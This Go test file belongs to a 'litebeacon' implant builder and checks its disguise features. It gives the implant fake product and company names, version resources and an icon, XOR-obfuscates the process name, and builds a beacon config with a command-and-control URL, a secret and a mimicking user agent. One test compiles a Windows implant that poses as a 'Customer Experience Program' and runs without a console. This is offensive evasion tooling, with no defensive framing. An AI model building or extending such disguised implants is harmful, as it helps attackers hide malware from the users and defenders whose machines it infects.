package litebeacon

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
	"testing"
)

func TestParseDisguiseAcceptsPreset(t *testing.T) {
	spec, err := ParseDisguise("Customer Experience Program", "Nimbus Software Ltd.", "2.0.3.0", "feedbackagent")
	if err != nil {
		t.Fatal(err)
	}
	if spec.DisplayName != "Customer Experience Program" || spec.Company != "Nimbus Software Ltd." {
		t.Fatalf("spec: %+v", spec)
	}
	if spec.Version != "2.0.3.0" || spec.ProcName != "feedbackagent" {
		t.Fatalf("spec: %+v", spec)
	}
}

func TestParseDisguisePadsShortVersion(t *testing.T) {
	spec, err := ParseDisguise("Sync Agent", "Example Labs", "3.1", "")
	if err != nil {
		t.Fatal(err)
	}
	if spec.Version != "3.1.0.0" {
		t.Fatalf("version: %s", spec.Version)
	}
}

func TestParseDisguiseDerivesProcNameFromDisplay(t *testing.T) {
	spec, err := ParseDisguise("Sync Background Agent", "Example Labs", "1.0", "")
	if err != nil {
		t.Fatal(err)
	}
	if spec.ProcName != "Sync Background" {
		t.Fatalf("procname: %q", spec.ProcName)
	}
}

func TestParseDisguiseRejectsBadInput(t *testing.T) {
	cases := []struct {
		name                      string
		display, company, version string
	}{
		{"empty display", "", "Company", "1.0"},
		{"non-ascii", "更新助手", "Company", "1.0"},
		{"quote", "Evil\"Name", "Company", "1.0"},
		{"backslash", `Evil\Name`, "Company", "1.0"},
		{"control char", "Evil\x01Name", "Company", "1.0"},
		{"display too long", strings.Repeat("a", 65), "Company", "1.0"},
		{"company too long", "Name", strings.Repeat("b", 65), "1.0"},
		{"bad version", "Name", "Company", "1.x"},
		{"five parts", "Name", "Company", "1.2.3.4.5"},
		{"huge part", "Name", "Company", "1.2.3.99999"},
		{"negative", "Name", "Company", "-1.0"},
	}
	for _, tc := range cases {
		if _, err := ParseDisguise(tc.display, tc.company, tc.version, "proc"); err == nil {
			t.Errorf("%s: expected error", tc.name)
		}
	}
}

func TestParseDisguiseRejectsBadProcName(t *testing.T) {
	if _, err := ParseDisguise("Name", "Company", "1.0", "sixteen__chars__"); err == nil {
		t.Fatal("expected error for 16-char procname")
	}
	if _, err := ParseDisguise("Name", "Company", "1.0", "has quote\""); err == nil {
		t.Fatal("expected error for quote in procname")
	}
}

func TestSetIconUsesBundledFallback(t *testing.T) {
	spec, err := ParseDisguise("Name", "Company", "1.0", "proc")
	if err != nil {
		t.Fatal(err)
	}
	if err := SetIcon(spec, ""); err != nil {
		t.Fatal(err)
	}
	if err := validateICO(spec.Icon); err != nil {
		t.Fatalf("bundled icon invalid: %v", err)
	}
}

func TestSetIconAcceptsUploadedICO(t *testing.T) {
	uploaded := buildTinyICO(t, 0x11)
	spec, err := ParseDisguise("Name", "Company", "1.0", "proc")
	if err != nil {
		t.Fatal(err)
	}
	if err := SetIcon(spec, base64.StdEncoding.EncodeToString(uploaded)); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(spec.Icon, uploaded) {
		t.Fatal("uploaded icon was replaced")
	}
}

func TestSetIconRejectsGarbage(t *testing.T) {
	spec, _ := ParseDisguise("Name", "Company", "1.0", "proc")
	if err := SetIcon(spec, "not-base64!!"); err == nil {
		t.Fatal("expected base64 error")
	}
	if err := SetIcon(spec, base64.StdEncoding.EncodeToString([]byte("JUNKJUNK"))); err == nil {
		t.Fatal("expected magic error")
	}
	huge := append(buildTinyICO(t, 0x22), make([]byte, 300*1024)...)
	if err := SetIcon(spec, base64.StdEncoding.EncodeToString(huge)); err == nil {
		t.Fatal("expected size error")
	}
}

func TestGenerateRCFields(t *testing.T) {
	spec, err := ParseDisguise("Customer Experience Program", "Nimbus Software Ltd.", "2.0.3.0", "feedbackagent")
	if err != nil {
		t.Fatal(err)
	}
	rc := string(generateRC(spec, true, "feedbackagent-windows-amd64.exe"))
	for _, want := range []string{
		"1 ICON \"icon.ico\"",
		"FILEVERSION 2,0,3,0",
		"PRODUCTVERSION 2,0,3,0",
		"VALUE \"FileDescription\", \"Customer Experience Program\"",
		"VALUE \"ProductName\", \"Customer Experience Program\"",
		"VALUE \"CompanyName\", \"Nimbus Software Ltd.\"",
		"VALUE \"FileVersion\", \"2.0.3.0\"",
		"VALUE \"OriginalFilename\", \"feedbackagent-windows-amd64.exe\"",
		"VALUE \"Translation\", 0x409, 1200",
	} {
		if !strings.Contains(rc, want) {
			t.Errorf("rc missing %q", want)
		}
	}
	withoutIcon := string(generateRC(spec, false, "x.exe"))
	if strings.Contains(withoutIcon, "ICON") {
		t.Error("rc without icon must not reference ICON")
	}
}

func TestGenerateConfigHProcNameRoundTrip(t *testing.T) {
	cfgH, err := GenerateConfigH(testConfigParams("feedbackagent"))
	if err != nil {
		t.Fatal(err)
	}
	xorRe := regexp.MustCompile(`#define CFG_XOR 0x([0-9a-f]{2})`)
	arrRe := regexp.MustCompile(`#define CFG_PNAME_LEN (\d+)\nstatic const unsigned char CFG_PNAME\[\d+\] = \{([0-9a-fx,]+)\}`)
	xm := xorRe.FindStringSubmatch(cfgH)
	am := arrRe.FindStringSubmatch(cfgH)
	if xm == nil || am == nil {
		t.Fatalf("config.h missing CFG_PNAME: %s", cfgH)
	}
	xk, _ := strconv.ParseUint(xm[1], 16, 8)
	var got []byte
	for _, part := range strings.Split(am[2], ",") {
		v, err := strconv.ParseUint(strings.TrimSpace(part), 0, 8) // 值带 0x 前缀，用 base 0
		if err != nil {
			t.Fatal(err)
		}
		got = append(got, byte(v)^byte(xk))
	}
	if string(got) != "feedbackagent" {
		t.Fatalf("decoded procname: %q", string(got))
	}
}

func TestGenerateConfigHOmitsEmptyProcName(t *testing.T) {
	cfgH, err := GenerateConfigH(testConfigParams(""))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(cfgH, "CFG_PNAME") {
		t.Fatal("empty proc name must not emit CFG_PNAME")
	}
}

func testConfigParams(procName string) ConfigParams {
	secret := base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{7}, 32))
	return ConfigParams{
		URL:             "https://example.com:8443/api/v2/sync",
		SecretB64:       secret,
		KeyName:         "k1",
		UserAgent:       "AppSync/2.4.1 (Windows NT 10.0; Win64; x64)",
		BaseIntervalSec: 10,
		ProcName:        procName,
	}
}

func TestWindowsImplantDisguiseLink(t *testing.T) {
	if os.Getenv("LITE_DISGUISE_LINK") != "1" {
		t.Skip("set LITE_DISGUISE_LINK=1 to compile a disguised windows exe")
	}
	spec, err := ParseDisguise("Customer Experience Program", "Nimbus Software Ltd.", "2.0.3.0", "feedbackagent")
	if err != nil {
		t.Fatal(err)
	}
	if err := SetIcon(spec, ""); err != nil {
		t.Fatal(err)
	}
	cfgH, err := GenerateConfigH(testConfigParams("feedbackagent"))
	if err != nil {
		t.Fatal(err)
	}
	data, err := compileImplant(cfgH, "windows", "amd64", spec, "feedbackagent-windows-amd64.exe")
	if err != nil {
		t.Fatal(err)
	}
	subsys, err := peSubsystem(data)
	if err != nil {
		t.Fatal(err)
	}
	if subsys != 2 {
		t.Fatalf("subsystem = %d, want 2 (GUI)", subsys)
	}
	for _, want := range []string{"Customer Experience Program", "Nimbus Software Ltd.", "feedbackagent-windows-amd64.exe"} {
		if !bytes.Contains(data, utf16le(want)) {
			t.Errorf("binary missing UTF-16 %q", want)
		}
	}
}

func peSubsystem(data []byte) (int, error) {
	i := bytes.Index(data, []byte("PE\x00\x00"))
	if i < 0 {
		return 0, fmt.Errorf("not a PE image")
	}
	opt := i + 4 + 20
	if opt+70 > len(data) {
		return 0, fmt.Errorf("truncated PE optional header")
	}
	return int(binary.LittleEndian.Uint16(data[opt+68:])), nil
}

func utf16le(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for _, r := range s {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}

func buildTinyICO(t *testing.T, fill byte) []byte {
	t.Helper()
	w, h := 16, 16
	xor := bytes.Repeat([]byte{fill, fill, fill, 0xff}, w*h)
	and := bytes.Repeat([]byte{0}, ((w+31)/32)*4*h)
	var bmp bytes.Buffer
	binary.Write(&bmp, binary.LittleEndian, uint32(40))
	binary.Write(&bmp, binary.LittleEndian, int32(w))
	binary.Write(&bmp, binary.LittleEndian, int32(h*2))
	binary.Write(&bmp, binary.LittleEndian, uint16(1))
	binary.Write(&bmp, binary.LittleEndian, uint16(32))
	binary.Write(&bmp, binary.LittleEndian, uint32(0))
	binary.Write(&bmp, binary.LittleEndian, uint32(len(xor)+len(and)))
	binary.Write(&bmp, binary.LittleEndian, uint32(0))
	binary.Write(&bmp, binary.LittleEndian, uint32(0))
	binary.Write(&bmp, binary.LittleEndian, uint32(0))
	binary.Write(&bmp, binary.LittleEndian, uint32(0))
	bmp.Write(xor)
	bmp.Write(and)
	var ico bytes.Buffer
	binary.Write(&ico, binary.LittleEndian, uint16(0))
	binary.Write(&ico, binary.LittleEndian, uint16(1))
	binary.Write(&ico, binary.LittleEndian, uint16(1))
	ico.Write([]byte{byte(w), byte(h), 0, 0})
	binary.Write(&ico, binary.LittleEndian, uint16(1))
	binary.Write(&ico, binary.LittleEndian, uint16(32))
	binary.Write(&ico, binary.LittleEndian, uint32(bmp.Len()))
	binary.Write(&ico, binary.LittleEndian, uint32(6+16))
	ico.Write(bmp.Bytes())
	return ico.Bytes()
}
